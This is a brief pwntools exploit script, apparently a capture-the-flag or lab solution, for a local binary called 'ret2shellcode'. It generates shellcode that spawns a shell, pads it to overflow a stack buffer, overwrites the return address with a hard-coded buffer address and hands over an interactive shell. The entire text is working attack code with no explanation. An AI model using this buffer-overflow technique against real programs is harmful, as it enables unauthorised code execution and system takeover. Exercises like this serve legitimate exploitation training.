from pwn import *

sh = process('./ret2shellcode')
ebp = 0xffffd2e8
esp = 0xffffd260
s_offset = 0x1c
buf2_addr = 0x0804A080
shellcode = asm(shellcraft.sh())
sh.sendline(shellcode+'A' * (ebp-esp-s_offset+4-len(shellcode)) + p32(buf2_addr))
sh.interactive()
